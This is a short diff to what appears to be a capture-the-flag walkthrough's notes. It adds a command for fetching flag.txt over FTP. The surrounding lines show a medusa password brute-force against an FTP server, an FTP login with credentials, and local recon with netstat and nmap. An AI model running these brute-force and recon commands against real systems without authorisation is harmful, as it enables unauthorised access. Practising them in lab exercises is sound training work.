@@ -120,6 +120,7 @@ Command for SSH to gain access : `ssh sshuser@<IP> -p PORT`
 
 Targeting FTP Server : `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5`  - Use this when into SSH Session of the Victim
 To login into FTP Server : `ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost`
+To download file from FTP Server use the command : `get flag.txt`
 ### Expanding the Attack Surface
 To list all services and and open ports : `ntestat -tulpn | grep LISTEN`
 For further recon, we can use : `nmap localhost`
